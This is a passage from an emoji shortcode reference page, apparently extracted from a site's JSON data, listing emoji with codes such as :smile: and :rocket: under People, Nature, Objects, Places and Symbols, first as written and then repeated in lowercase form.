🏂 :snowboarder:\n🏊 :swimmer:                          🏄 :surfer:                       🎿 :ski:\n♠️ :spades:                           ♥️ :hearts:                       ♣️ :clubs:\n♦️ :diamonds:                         💎 :gem:                          💍 :ring:\n🏆 :trophy:                           🎼 :musical_score:                🎹 :musical_keyboard:\n🎻 :violin:                           👾 :space_invader:                🎮 :video_game:\n🃏 :black_joker:                      🎴 :flower_playing_cards:         🎲 :game_die:\n🎯 :dart:                             🀄️ :mahjong:                     🎬 :clapper:\n📝 :memo:                             📝 :pencil:                       📖 :book:\n🎨 :art:                              🎤 :microphone:                   🎧 :headphones:\n🎺 :trumpet:                          🎷 :saxophone:                    🎸 :guitar:\n👞 :shoe:                             👡 :sandal:                       👠 :high_heel:\n💄 :lipstick:                         👢 :boot:                         👕 :shirt:\n👕 :tshirt:                           👔 :necktie:                      👚 :womans_clothes:\n👗 :dress:                            🎽 :running_shirt_with_sash:      👖 :jeans:\n👘 :kimono:                           👙 :bikini:                       🎀 :ribbon:\n🎩 :tophat:                           👑 :crown:                        👒 :womans_hat:\n👞 :mans_shoe:                        🌂 :closed_umbrella:              💼 :briefcase:\n👜 :handbag:                          👝 :pouch:                        👛 :purse:\n👓 :eyeglasses:                       🎣 :fishing_pole_and_fish:        ☕️ :coffee:\n🍵 :tea:                              🍶 :sake:                         🍼 :baby_bottle:\n🍺 :beer:                             🍻 :beers:                        🍸 :cocktail:\n🍹 :tropical_drink:                   🍷 :wine_glass:                   🍴 :fork_and_knife:\n🍕 :pizza:                            🍔 :hamburger:                    🍟 :fries:\n🍗 :poultry_leg:                      🍖 :meat_on_bone:                 🍝 :spaghetti:\n🍛 :curry:                            🍤 :fried_shrimp:                 🍱 :bento:\n🍣 :sushi:                            🍥 :fish_cake:                    🍙 :rice_ball:\n🍘 :rice_cracker:                     🍚 :rice:                         🍜 :ramen:\n🍲 :stew:                             🍢 :oden:                         🍡 :dango:\n🥚 :egg:                              🍞 :bread:                        🍩 :doughnut:\n🍮 :custard:                          🍦 :icecream:                     🍨 :ice_cream:\n🍧 :shaved_ice:                       🎂 :birthday:                     🍰 :cake:\n🍪 :cookie:                           🍫 :chocolate_bar:                🍬 :candy:\n🍭 :lollipop:                         🍯 :honey_pot:                    🍎 :apple:\n🍏 :green_apple:                      🍊 :tangerine:                    🍋 :lemon:\n🍒 :cherries:                         🍇 :grapes:                       🍉 :watermelon:\n🍓 :strawberry:                       🍑 :peach:                        🍈 :melon:\n🍌 :banana:                           🍐 :pear:                         🍍 :pineapple:\n🍠 :sweet_potato:                     🍆 :eggplant:                     🍅 :tomato:\n🌽 :corn:                                                               \n\n\n# Places\n\n🏠 :HOUSE:                 🏡 :HOUSE_WITH_GARDEN:         🏫 :SCHOOL:\n🏢 :office:                🏣 :post_office:               🏥 :hospital:\n🏦 :bank:                  🏪 :convenience_store:         🏩 :love_hotel:\n🏨 :hotel:                 💒 :wedding:                   ⛪️ :church:\n🏬 :department_store:      🏤 :european_post_office:      🌇 :city_sunrise:\n🌆 :city_sunset:           🏯 :japanese_castle:           🏰 :european_castle:\n⛺️ :tent:                  🏭 :factory:                   🗼 :tokyo_tower:\n🗾 :japan:                 🗻 :mount_fuji:                🌄 :sunrise_over_mountains:\n🌅 :sunrise:               🌠 :stars:                     🗽 :statue_of_liberty:\n🌉 :bridge_at_night:       🎠 :carousel_horse:            🌈 :rainbow:\n🎡 :ferris_wheel:          ⛲️ :fountain:                  🎢 :roller_coaster:\n🚢 :ship:                  🚤 :speedboat:                 ⛵️ :boat:\n⛵️ :sailboat:              🚣 :rowboat:                   ⚓️ :anchor:\n🚀 :rocket:                ✈️ :airplane:                  🚁 :helicopter:\n🚂 :steam_locomotive:      🚊 :tram:                      🚞 :mountain_railway:\n🚲 :bike:                  🚡 :aerial_tramway:            🚟 :suspension_railway:\n🚠 :mountain_cableway:     🚜 :tractor:                   🚙 :blue_car:\n🚘 :oncoming_automobile:   🚗 :car:                       🚗 :red_car:\n🚕 :taxi:                  🚖 :oncoming_taxi:             🚛 :articulated_lorry:\n🚌 :bus:                   🚍 :oncoming_bus:              🚨 :rotating_light:\n🚓 :police_car:            🚔 :oncoming_police_car:       🚒 :fire_engine:\n🚑 :ambulance:             🚐 :minibus:                   🚚 :truck:\n🚋 :train:                 🚉 :station:                   🚆 :train2:\n🚅 :bullettrain_front:     🚄 :bullettrain_side:          🚈 :light_rail:\n🚝 :monorail:              🚃 :railway_car:               🚎 :trolleybus:\n🎫 :ticket:                ⛽️ :fuelpump:                  🚦 :vertical_traffic_light:\n🚥 :traffic_light:         ⚠️ :warning:                   🚧 :construction:\n🔰 :beginner:              🏧 :atm:                       🎰 :slot_machine:\n🚏 :busstop:               💈 :barber:                    ♨️ :hotsprings:\n🏁 :checkered_flag:        🎌 :crossed_flags:             🏮 :izakaya_lantern:\n🗿 :moyai:                 🎪 :circus_tent:               🎭 :performing_arts:\n📍 :round_pushpin:         🚩 :triangular_flag_on_post:   🇯🇵 :jp:\n🇰🇷 :kr:                  🇨🇳 :cn:                      🇺🇸 :us:\n🇫🇷 :fr:                  🇪🇸 :es:                      🇮🇹 :it:\n🇷🇺 :ru:                  🇬🇧 :gb:                      🇬🇧 :uk:\n🇩🇪 :de:                                                 \n\n\n# Symbols\n\n                                                                       \n1️⃣ :one:                             2️⃣ :two:                        3️⃣ :three:\n4️⃣ :four:                            5️⃣ :five:                       6️⃣ :six:\n7️⃣ :seven:                           8️⃣ :eight:                      9️⃣ :nine:\n🔟 :keycap_ten:                       🔢 :1234:                        0️⃣ :zero:\n#️⃣ :hash:                            🔣 :symbols:                     ◀️ :arrow_backward:\n⬇️ :arrow_down:                       ▶️ :arrow_forward:               ⬅️ :arrow_left:\n🔠 :capital_abcd:                     🔡 :abcd:                        🔤 :abc:\n↙️ :arrow_lower_left:                 ↘️ :arrow_lower_right:           ➡️ :arrow_right:\n⬆️ :arrow_up:                         ↖️ :arrow_upper_left:            ↗️ :arrow_upper_right:\n⏬ :arrow_double_down:                 ⏫ :arrow_double_up:              🔽 :arrow_down_small:\n⤵️ :arrow_heading_down:               ⤴️ :arrow_heading_up:            ↩️:leftwards_arrow_with_hook:\n↪️ :arrow_right_hook:                 ↔️ :left_right_arrow:            ↕️ :arrow_up_down:\n🔼 :arrow_up_small:                   🔃 :arrows_clockwise:            🔄 :arrows_counterclockwise:\n⏪ :rewind:                            ⏩ :fast_forward:                 ℹ️ :information_source:\n🆗 :ok:                               🔀 :twisted_rightwards_arrows:   🔁 :repeat:\n🔂 :repeat_one:                       🆕 :new:                         🔝 :top:\n🆙 :up:                               🆒 :cool:                        🆓 :free:\n🆖 :ng:                               🎦 :cinema:                      🈁 :koko:\n📶 :signal_strength:                  🈹 :u5272:                       🈴 :u5408:\n🈺 :u55b6:                            🈯️ :u6307:                      🈷️ :u6708:\n🈶 :u6709:                            🈵 :u6e80:                       🈚️ :u7121:\n🈸 :u7533:                            🈳 :u7a7a:                       🈲 :u7981:\n🈂️ :sa:                              🚻 :restroom:                    🚹 :mens:\n🚺 :womens:                           🚼 :baby_symbol:                 🚭 :no_smoking:\n🅿️ :parking:                         ♿️ :wheelchair:                  🚇 :metro:\n🛄 :baggage_claim:                    🉑 :accept:                      🚾 :wc:\n🚰 :potable_water:                    🚮 :put_litter_in_its_place:     ㊙️ :secret:\n㊗️ :congratulations:                  Ⓜ️ :m:                           🛂 :passport_control:\n🛅 :left_luggage:                     🛃 :customs:                     🉐 :ideograph_advantage:\n🆑 :cl:                               🆘 :sos:                         🆔 :id:\n🚫 :no_entry_sign:                    🔞 :underage:                    📵 :no_mobile_phones:\n🚯 :do_not_litter:                    🚱 :non-potable_water:           🚳 :no_bicycles:\n🚷 :no_pedestrians:                   🚸 :children_crossing:           ⛔️ :no_entry:\n✳️ :eight_spoked_asterisk:            ✴️ :eight_pointed_black_star:    💟 :heart_decoration:\n🆚 :vs:                               📳 :vibration_mode:              📴 :mobile_phone_off:\n💹 :chart:                            💱 :currency_exchange:           ♈️ :aries:\n♉️ :taurus:                           ♊️ :gemini:                      ♋️ :cancer:\n♌️ :leo:                              ♍️ :virgo:                       ♎️ :libra:\n♏️ :scorpius:                         ♐️ :sagittarius:                 ♑️ :capricorn:\n♒️ :aquarius:                         ♓️ :pisces:                      ⛎ :ophiuchus:\n🔯 :six_pointed_star:                 ❎:negative_squared_cross_mark:   🅰️ :a:\n🅱️ :b:                               🆎 :ab:                          🅾️ :o2:\n💠:diamond_shape_with_a_dot_inside:   ♻️ :recycle:                     🔚 :end:\n🔛 :on:                               🔜 :soon:                        🕐 :clock1:\n🕜 :clock130:                         🕙 :clock10:                     🕥 :clock1030:\n🕚 :clock11:                          🕦 :clock1130:                   🕛 :clock12:\n🕧 :clock1230:                        🕑 :clock2:                      🕝 :clock230:\n🕒 :clock3:                           🕞 :clock330:                    🕓 :clock4:\n🕟 :clock430:                         🕔 :clock5:                      🕠 :clock530:\n🕕 :clock6:                           🕡 :clock630:                    🕖 :clock7:\n🕢 :clock730:                         🕗 :clock8:                      🕣 :clock830:\n🕘 :clock9:                           🕤 :clock930:                    💲 :heavy_dollar_sign:\n©️ :copyright:                        ®️ :registered:                  ™️ :tm:\n❌ :x:                                 ❗️ :heavy_exclamation_mark:      ‼️ :bangbang:\n⁉️ :interrobang:                      ⭕️ :o:                           ✖️ :heavy_multiplication_x:\n➕ :heavy_plus_sign:                   ➖ :heavy_minus_sign:             ➗ :heavy_division_sign:\n💮 :white_flower:                     💯 :100:                         ✔️ :heavy_check_mark:\n☑️ :ballot_box_with_check:            🔘 :radio_button:                🔗 :link:\n➰ :curly_loop:                        〰️ :wavy_dash:                   〽️ :part_alternation_mark:\n🔱 :trident:                          ▪️ :black_square:                🔳 :white_square:\n✅ :white_check_mark:                  🔲 :black_square_button:         ⬛️:black_large_square:\n⚫️ :black_circle:                     ⚪️ :white_circle:                🔴 :red_circle:\n🔵 :large_blue_circle:                🔷 :large_blue_diamond:          🔶 :large_orange_diamond:\n🔹 :small_blue_diamond:               🔸 :small_orange_diamond:        🔺 :small_red_triangle:\n🔻 :small_red_triangle_down:                                           ",normalizedContent:"# emoji表情\n\n\n# emoji分类\n\n\n# people\n\n😱 :scream:                         😄 :smile:                          😆 :laughing:\n😊 :blush:                          😃 :smiley:                         ☺️ :relaxed:\n😏 :smirk:                          😍 :heart_eyes:                     😘 :kissing_heart:\n😚 :kissing_closed_eyes:            😳 :flushed:                        😌 :relieved:\n😆 :satisfied:                      😁 :grin:                           😉 :wink:\n😜 :stuck_out_tongue_winking_eye:   😝 :stuck_out_tongue_closed_eyes:   😀 :grinning:\n😗 :kissing:                        😙 :kissing_smiling_eyes:           😛 :stuck_out_tongue:\n😴 :sleeping:                       😟 :worried:                        😦 :frowning:\n😧 :anguished:                      😮 :open_mouth:                     😬 :grimacing:\n😕 :confused:                       😯 :hushed:                         😑 :expressionless:\n😒 :unamused:                       😅 :sweat_smile:                    😓 :sweat:\n😥 :disappointed_relieved:          😩 :weary:                          😔 :pensive:\n😞 :disappointed:                   😖 :confounded:                     😨 :fearful:\n😰 :cold_sweat:                     😣 :persevere:                      😢 :cry:\n😭 :sob:                            😂 :joy:                            😲 :astonished:\n😎 :sunglasses:                     😵 :dizzy_face:                     😫 :tired_face:\n😠 :angry:                          😡 :rage:                           😤 :triumph:\n😪 :sleepy:                         😋 :yum:                            😷 :mask:\n👿 :imp:                            😐 :neutral_face:                   😶 :no_mouth:\n\n                                                               \n😈 :smiling_imp:                😇 :innocent:                  👽 :alien:\n😇 :innocent:                   💧 :droplet:                   💛 :yellow_heart:\n💙 :blue_heart:                 💜 :purple_heart:              ❤️ :heart:\n💚 :green_heart:                💔 :broken_heart:              💓 :heartbeat:\n💗 :heartpulse:                 💕 :two_hearts:                💞 :revolving_hearts:\n💘 :cupid:                      💖 :sparkling_heart:           ✨ :sparkles:\n⭐️ :star:                       🌟 :star2:                     💫 :dizzy:\n💥 :boom:                       💥 :collision:                 💢 :anger:\n❗️ :exclamation:                ❓ :question:                   ❕ :grey_exclamation:\n❔ :grey_question:               💤 :zzz:                       💨 :dash:\n💦 :sweat_drops:                🎶 :notes:                     🎵 :musical_note:\n🔥 :fire:                       💩 :hankey:                    💩 :poop:\n💩 :shit:                       👍 :+1:                        👍 :thumbsup:\n👎 :-1:                         👎 :thumbsdown:                👌 :ok_hand:\n👊 :punch:                      👊 :facepunch:                 ✊ :fist:\n✌️ :v:                          👋 :wave:                      ✋ :hand:\n✋ :raised_hand:                 👐 :open_hands:                ☝️ :point_up:\n👇 :point_down:                 👈 :point_left:                👉 :point_right:\n🙌 :raised_hands:               🙏 :pray:                      👆 :point_up_2:\n👏 :clap:                       💪 :muscle:                    🤘 :metal:\n🖕 :fu:                         🚶 :walking:                   🏃 :runner:\n🏃 :running:                    👫 :couple:                    👪 :family:\n👬 :two_men_holding_hands:      👭 :two_women_holding_hands:   💃 :dancer:\n👯 :dancers:                    🙆 :ok_woman:                  🙅 :no_good:\n💁 :information_desk_person:    🙋 :raising_hand:              👰 :bride_with_veil:\n🙎 :person_with_pouting_face:   🙍 :person_frowning:           🙇 :bow:\n💑 :couple_with_heart:          💆 :massage:                   👥 :busts_in_silhouette:\n💇 :haircut:                    💅 :nail_care:                 👦 :boy:\n👧 :girl:                       👩 :woman:                     👨 :man:\n👶 :baby:                       👵 :older_woman:               👴 :older_man:\n👱 :person_with_blond_hair:     👲 :man_with_gua_pi_mao:       👳 :man_with_turban:\n👷 :construction_worker:        👮 :cop:                       👼 :angel:\n👸 :princess:                   😺 :smiley_cat:                😸 :smile_cat:\n😻 :heart_eyes_cat:             😽 :kissing_cat:               😼 :smirk_cat:\n🙀 :scream_cat:                 😿 :crying_cat_face:           😹 :joy_cat:\n😾 :pouting_cat:                👹 :japanese_ogre:             👺 :japanese_goblin:\n🙈 :see_no_evil:                🙉 :hear_no_evil:              🙊 :speak_no_evil:\n💂 :guardsman:                  💀 :skull:                     🐾 :feet:\n👄 :lips:                       💋 :kiss:                      💬 :speech_balloon:\n👂 :ear:                        👀 :eyes:                      👃 :nose:\n👅 :tongue:                     💌 :love_letter:               👤 :bust_in_silhouette:\n👥 :busts_in_silhouette:        💭 :thought_balloon:           \n\n\n# nature\n\n                                                                \n☀️ :sunny:                          ☔️ :umbrella:               ☁️ :cloud:\n❄️ :snowflake:                      ⛄️ :snowman:                ⚡️ :zap:\n🌀 :cyclone:                        🌁 :foggy:                  🌊 :ocean:\n🐱 :cat:                            🐶 :dog:                    🐭 :mouse:\n🐹 :hamster:                        🐰 :rabbit:                 🐺 :wolf:\n🐸 :frog:                           🐯 :tiger:                  🐨 :koala:\n🐻 :bear:                           🐷 :pig:                    🐽 :pig_nose:\n🐮 :cow:                            🐗 :boar:                   🐵 :monkey_face:\n🐒 :monkey:                         🐴 :horse:                  🐎 :racehorse:\n🐫 :camel:                          🐑 :sheep:                  🐘 :elephant:\n🐼 :panda_face:                     🐍 :snake:                  🐦 :bird:\n🐤 :baby_chick:                     🐥 :hatched_chick:          🐣 :hatching_chick:\n🐔 :chicken:                        🐧 :penguin:                🐢 :turtle:\n🐛 :bug:                            🐝 :honeybee:               🐜 :ant:\n🐞 :beetle:                         🐌 :snail:                  🐙 :octopus:\n🐠 :tropical_fish:                  🐟 :fish:                   🐳 :whale:\n🐋 :whale2:                         🐬 :dolphin:                🐄 :cow2:\n🐏 :ram:                            🐀 :rat:                    🐃 :water_buffalo:\n🐅 :tiger2:                         🐇 :rabbit2:                🐉 :dragon:\n🐐 :goat:                           🐓 :rooster:                🐕 :dog2:\n🐖 :pig2:                           🐁 :mouse2:                 🐂 :ox:\n🐲 :dragon_face:                    🐡 :blowfish:               🐊 :crocodile:\n🐪 :dromedary_camel:                🐆 :leopard:                🐈 :cat2:\n🐩 :poodle:                         🐾 :paw_prints:             💐 :bouquet:\n🌸 :cherry_blossom:                 🌷 :tulip:                  🍀 :four_leaf_clover:\n🌹 :rose:                           🌻 :sunflower:              🌺 :hibiscus:\n🍁 :maple_leaf:                     🍃 :leaves:                 🍂 :fallen_leaf:\n🌿 :herb:                           🍄 :mushroom:               🌵 :cactus:\n🌴 :palm_tree:                      🌲 :evergreen_tree:         🌳 :deciduous_tree:\n🌰 :chestnut:                       🌱 :seedling:               🌼 :blossom:\n🌾 :ear_of_rice:                    🐚 :shell:                  🌐 :globe_with_meridians:\n🌞 :sun_with_face:                  🌝 :full_moon_with_face:    🌚 :new_moon_with_face:\n🌑 :new_moon:                       🌒 :waxing_crescent_moon:   🌓 :first_quarter_moon:\n🌔 :waxing_gibbous_moon:            🌕 :full_moon:              🌖 :waning_gibbous_moon:\n🌗 :last_quarter_moon:              🌘 :waning_crescent_moon:   🌜 :last_quarter_moon_with_face:\n🌛 :first_quarter_moon_with_face:   🌔 :moon:                   🌍 :earth_africa:\n🌎 :earth_americas:                 🌏 :earth_asia:             🌋 :volcano:\n🌌 :milky_way:                      ⛅️ :partly_sunny:           \n\n\n# objects\n\n                                                                        \n🎍 :bamboo:                           💝 :gift_heart:                   🎎 :dolls:\n🎒 :school_satchel:                   🎓 :mortar_board:                 🎏 :flags:\n🎆 :fireworks:                        🎇 :sparkler:                     🎐 :wind_chime:\n🎑 :rice_scene:                       🎃 :jack_o_lantern:               👻 :ghost:\n🎅 :santa:                            🎄 :christmas_tree:               🎁 :gift:\n🔔 :bell:                             🔕 :no_bell:                      🎋 :tanabata_tree:\n🎉 :tada:                             🎊 :confetti_ball:                🎈 :balloon:\n🔮 :crystal_ball:                     💿 :cd:                           📀 :dvd:\n💾 :floppy_disk:                      📷 :camera:                       📹 :video_camera:\n🎥 :movie_camera:                     💻 :computer:                     📺 :tv:\n📱 :iphone:                           ☎️ :phone:                        ☎️ :telephone:\n📞 :telephone_receiver:               📟 :pager:                        📠 :fax:\n💽 :minidisc:                         📼 :vhs:                          🔉 :sound:\n🔈 :speaker:                          🔇 :mute:                         📢 :loudspeaker:\n📣 :mega:                             ⌛️ :hourglass:                    ⏳ :hourglass_flowing_sand:\n⏰ :alarm_clock:                       ⌚️ :watch:                        📻 :radio:\n📡 :satellite:                        ➿ :loop:                          🔍 :mag:\n🔎 :mag_right:                        🔓 :unlock:                       🔒 :lock:\n🔏 :lock_with_ink_pen:                🔐 :closed_lock_with_key:         🔑 :key:\n💡 :bulb:                             🔦 :flashlight:                   🔆 :high_brightness:\n🔅 :low_brightness:                   🔌 :electric_plug:                🔋 :battery:\n📲 :calling:                          ✉️ :email:                        📫 :mailbox:\n📮 :postbox:                          🛀 :bath:                         🛁 :bathtub:\n🚿 :shower:                           🚽 :toilet:                       🔧 :wrench:\n🔩 :nut_and_bolt:                     🔨 :hammer:                       💺 :seat:\n💰 :moneybag:                         💴 :yen:                          💵 :dollar:\n💷 :pound:                            💶 :euro:                         💳 :credit_card:\n💸 :money_with_wings:                 📧 :e-mail:                       📥 :inbox_tray:\n📤 :outbox_tray:                      ✉️ :envelope:                     📨 :incoming_envelope:\n📯 :postal_horn:                      📪 :mailbox_closed:               📬 :mailbox_with_mail:\n📭 :mailbox_with_no_mail:             🚪 :door:                         🚬 :smoking:\n💣 :bomb:                             🔫 :gun:                          🔪 :hocho:\n💊 :pill:                             💉 :syringe:                      📄 :page_facing_up:\n📃 :page_with_curl:                   📑 :bookmark_tabs:                📊 :bar_chart:\n📈 :chart_with_upwards_trend:         📉 :chart_with_downwards_trend:   📜 :scroll:\n📋 :clipboard:                        📆 :calendar:                     📅 :date:\n📇 :card_index:                       📁 :file_folder:                  📂 :open_file_folder:\n✂️ :scissors:                         📌 :pushpin:                      📎 :paperclip:\n✒️ :black_nib:                        ✏️ :pencil2:                      📏 :straight_ruler:\n📐 :triangular_ruler:                 📕 :closed_book:                  📗 :green_book:\n📘 :blue_book:                        📙 :orange_book:                  📓 :notebook:\n📔 :notebook_with_decorative_cover:   📒 :ledger:                       📚 :books:\n🔖 :bookmark:                         📛 :name_badge:                   🔬 :microscope:\n🔭 :telescope:                        📰 :newspaper:                    🏈 :football:\n🏀 :basketball:                       ⚽️ :soccer:                       ⚾️ :baseball:\n🎾 :tennis:                           🎱 :8ball:                        🏉 :rugby_football:\n🎳 :bowling:                          ⛳️ :golf:                         🚵 :mountain_bicyclist:\n🚴 :bicyclist:                        🏇 :horse_racing:                 🏂 :snowboarder:\n🏊 :swimmer:                          🏄 :surfer:                       🎿 :ski:\n♠️ :spades:                           ♥️ :hearts:                       ♣️ :clubs:\n♦️ :diamonds:                         💎 :gem:                          💍 :ring:\n🏆 :trophy:                           🎼 :musical_score:                🎹 :musical_keyboard:\n🎻 :violin:                           👾 :space_invader:                🎮 :video_game:\n🃏 :black_joker:                      🎴 :flower_playing_cards:         🎲 :game_die:\n🎯 :dart:                             🀄️ :mahjong:                     🎬 :clapper:\n📝 :memo:                             📝 :pencil:                       📖 :book:\n🎨 :art:                              🎤 :microphone:                   🎧 :headphones:\n🎺 :trumpet:                          🎷 :saxophone:                    🎸 :guitar:\n👞 :shoe:                             👡 :sandal:                       👠 :high_heel:\n💄 :lipstick:                         👢 :boot:                         👕 :shirt:\n👕 :tshirt:                           👔 :necktie:                      👚 :womans_clothes:\n👗 :dress:                            🎽 :running_shirt_with_sash:      👖 :jeans:\n👘 :kimono:                           👙 :bikini:                       🎀 :ribbon:\n🎩 :tophat:                           👑 :crown:                        👒 :womans_hat:\n👞 :mans_shoe:                        🌂 :closed_umbrella:              💼 :briefcase:\n👜 :handbag:                          👝 :pouch:                        👛 :purse:\n👓 :eyeglasses:                       🎣 :fishing_pole_and_fish:        ☕️ :coffee:\n🍵 :tea:                              🍶 :sake:                         🍼 :baby_bottle:\n🍺 :beer:                             🍻 :beers:                        🍸 :cocktail:\n🍹 :tropical_drink:                   🍷 :wine_glass:                   🍴 :fork_and_knife:\n🍕 :pizza:                            🍔 :hamburger:                    🍟 :fries:\n🍗 :poultry_leg:                      🍖 :meat_on_bone:                 🍝 :spaghetti:\n🍛 :curry:                            🍤 :fried_shrimp:                 🍱 :bento:\n🍣 :sushi:                            🍥 :fish_cake:                    🍙 :rice_ball:\n🍘 :rice_cracker:                     🍚 :rice:                         🍜 :ramen:\n🍲 :stew:                             🍢 :oden:                         🍡 :dango:\n🥚 :egg:                              🍞 :bread:                        🍩 :doughnut:\n🍮 :custard:                          🍦 :icecream:                     🍨 :ice_cream:\n🍧 :shaved_ice:                       🎂 :birthday:                     🍰 :cake:\n🍪 :cookie:                           🍫 :chocolate_bar:                🍬 :candy:\n🍭 :lollipop:                         🍯 :honey_pot:                    🍎 :apple:\n🍏 :green_apple:                      🍊 :tangerine:                    🍋 :lemon:\n🍒 :cherries:                         🍇 :grapes:                       🍉 :watermelon:\n🍓 :strawberry:                       🍑 :peach:                        🍈 :melon:\n🍌 :banana:                           🍐 :pear:                         🍍 :pineapple:\n🍠 :sweet_potato:                     🍆 :eggplant:                     🍅 :tomato:\n🌽 :corn:                                                               \n\n\n# places\n\n🏠 :house:                 🏡 :house_with_garden:         🏫 :school:\n🏢 :office:                🏣 :post_office:               🏥 :hospital:\n🏦 :bank:                  🏪 :convenience_store:         🏩 :love_hotel:\n🏨 :hotel:                 💒 :wedding:                   ⛪️ :church:\n🏬 :department_store:      🏤 :european_post_office:      🌇 :city_sunrise:\n🌆 :city_sunset:           🏯 :japanese_castle:           🏰 :european_castle:\n⛺️ :tent:                  🏭 :factory:                   🗼 :tokyo_tower:\n🗾 :japan:                 🗻 :mount_fuji:                🌄 :sunrise_over_mountains:\n🌅 :sunrise:               🌠 :stars:                     🗽 :statue_of_liberty:\n🌉 :bridge_at_night:       🎠 :carousel_horse:            🌈 :rainbow:\n🎡 :ferris_wheel:          ⛲️ :fountain:                  🎢 :roller_coaster:\n🚢 :ship:                  🚤 :speedboat:                 ⛵️ :boat:\n⛵️ :sailboat:              🚣 :rowboat:                   ⚓️ :anchor:\n🚀 :rocket:                ✈️ :airplane:                  🚁 :helicopter:\n🚂 :steam_locomotive:      🚊 :tram:                      🚞 :mountain_railway:\n🚲 :bike:                  🚡 :aerial_tramway:            🚟 :suspension_railway:\n🚠 :mountain_cableway:     🚜 :tractor:                   🚙 :blue_car:\n🚘 :oncoming_automobile:   🚗 :car:                       🚗 :red_car:\n🚕 :taxi:                  🚖 :oncoming_taxi:             🚛 :articulated_lorry:\n🚌 :bus:                   🚍 :oncoming_bus:              🚨 :rotating_light:\n🚓 :police_car:            🚔 :oncoming_police_car:       🚒 :fire_engine:\n🚑 :ambulance:             🚐 :minibus:                   🚚 :truck:\n🚋 :train:                 🚉 :station:                   🚆 :train2:\n🚅 :bullettrain_front:     🚄 :bullettrain_side:          🚈 :light_rail:\n🚝 :monorail:              🚃 :railway_car:               🚎 :trolleybus:\n🎫 :ticket:                ⛽️ :fuelpump:                  🚦 :vertical_traffic_light:\n🚥 :traffic_light:         ⚠️ :warning:                   🚧 :construction:\n🔰 :beginner:              🏧 :atm:                       🎰 :slot_machine:\n🚏 :busstop:               💈 :barber:                    ♨️ :hotsprings:\n🏁 :checkered_flag:        🎌 :crossed_flags:             🏮 :izakaya_lantern:\n🗿 :moyai:                 🎪 :circus_tent:               🎭 :performing_arts:\n📍 :round_pushpin:         🚩 :triangular_flag_on_post:   🇯🇵 :jp:\n🇰🇷 :kr:                  🇨🇳 :cn:                      🇺🇸 :us:\n🇫🇷 :fr:                  🇪🇸 :es:                      🇮🇹 :it:\n🇷🇺 :ru:                  🇬🇧 :gb:                      🇬🇧 :uk:\n🇩🇪 :de:                                                 \n\n\n# symbols\n\n                                                                       \n1️⃣ :one:                             2️⃣ :two:                        3️⃣ :three:\n4️⃣ :four:                            5️⃣ :five:                       6️⃣ :six:\n7️⃣ :seven:                           8️⃣ :eight:                      9️⃣ :nine:\n🔟 :keycap_ten:                       🔢 :1234:                        0️⃣ :zero:\n#️⃣ :hash:                            🔣 :symbols:                     ◀️ :arrow_backward:\n⬇️ :arrow_down:                       ▶️ :arrow_forward:               ⬅️ :arrow_left:\n🔠 :capital_abcd:                     🔡 :abcd:                        🔤 :abc:\n↙️ :arrow_lower_left:                 ↘️ :arrow_lower_right:           ➡️ :arrow_right:\n⬆️ :arrow_up:                         ↖️ :arrow_upper_left:            ↗️ :arrow_upper_right:\n⏬ :arrow_double_down:                 ⏫ :arrow_double_up:              🔽 :arrow_down_small:\n⤵️ :arrow_heading_down:               ⤴️ :arrow_heading_up:            ↩️:leftwards_arrow_with_hook:\n↪️ :arrow_right_hook:                 ↔️ :left_right_arrow:            ↕️ :arrow_up_down:\n🔼 :arrow_up_small:                   🔃 :arrows_clockwise:            🔄 :arrows_counterclockwise:\n⏪ :rewind:                            ⏩ :fast_forward:                 ℹ️ :information_source:\n🆗 :ok:                               🔀 :twisted_rightwards_arrows:   🔁 :repeat:\n🔂 :repeat_one:                       🆕 :new:                         🔝 :top:\n🆙 :up:                               🆒 :cool:                        🆓 :free:\n🆖 :ng:                               🎦 :cinema:                      🈁 :koko:\n📶 :signal_strength:                  🈹 :u5272:                       🈴 :u5408:\n🈺 :u55b6:                            🈯️ :u6307:                      🈷️ :u6708:\n🈶 :u6709:                            🈵 :u6e80:                       🈚️ :u7121:\n🈸 :u7533:                            🈳 :u7a7a:                       🈲 :u7981:\n🈂️ :sa:                              🚻 :restroom:                    🚹 :mens:\n🚺 :womens:                           🚼 :baby_symbol:                 🚭 :no_smoking:\n🅿️ :parking:                         ♿️ :wheelchair:                  🚇 :metro:\n🛄 :baggage_claim:                    🉑 :accept:                      🚾 :wc:\n🚰 :potable_water:                    🚮 :put_litter_in_its_place:     ㊙️ :secret:\n㊗️ :congratulations:                  ⓜ️ :m:                           🛂 :passport_control:\n🛅 :left_luggage:                     🛃 :customs:                     🉐 :ideograph_advantage:\n🆑 :cl:                               🆘 :sos:                         🆔 :id:\n🚫 :no_entry_sign:                    🔞 :underage:                    📵 :no_mobile_phones:\n🚯 :do_not_litter:                    🚱 :non-potable_water:           🚳 :no_bicycles:\n🚷 :no_pedestrians:                   🚸 :children_crossing:           ⛔️ :no_entry:\n✳️ :eight_spoked_asterisk:            ✴️ :eight_pointed_black_star:    💟 :heart_decoration:\n🆚 :vs:                               📳 :vibration_mode:              📴 :mobile_phone_off:\n💹 :chart:                            💱 :currency_exchange:           ♈️ :aries:\n♉️ :taurus:                           ♊️ :gemini:                      ♋️ :cancer:\n♌️ :leo:                              ♍️ :virgo:                       ♎️ :libra:\n♏️ :scorpius:                         ♐️ :sagittarius:                 ♑️ :capricorn:\n♒️ :aquarius:                         ♓️ :pisces:                      ⛎ :ophiuchus:\n🔯 :six_pointed_star:                 ❎:negative_squared_cross_mark:   🅰️ :a:\n🅱️ :b:                               🆎 :ab:                          🅾️ :o2:\n💠:diamond_shape_with_a_dot_inside:   ♻️ :recycle:                     🔚 :end:\n🔛 :on:                               🔜 :soon:                        🕐 :clock1:\n🕜 :clock130:                         🕙 :clock10:                     🕥 :clock1030:\n🕚 :clock11:                          🕦 :clock1130:                   🕛 :clock12:\n🕧 :clock1230:                        🕑 :clock2:                      🕝 :clock230:\n🕒 :clock3:                           🕞 :clock330:                    🕓 :clock4:\n🕟 :clock430:                         🕔 :clock5:                      🕠 :clock530:\n🕕 :clock6:                           🕡 :clock630:                    🕖 :clock7:\n🕢 :clock730:                         🕗 :clock8:                      🕣 :clock830:\n🕘 :clock9:                           🕤 :clock930:                    💲 :heavy_dollar_sign:\n©️ :copyright:                        ®️ :registered:                  ™️ :tm:\n❌ :x:                                 ❗️ :heavy_exclamation_mark:      ‼️ :bangbang:\n⁉️ :interrobang:                      ⭕️ :o:                           ✖️ :heavy_multiplication_x:\n➕ :heavy_plus_sign:                   ➖ :heavy_minus_sign:             ➗ :heavy_division_sign:\n💮 :white_flower:                     💯 :100:                         ✔️ :heavy_check_mark:\n☑️ 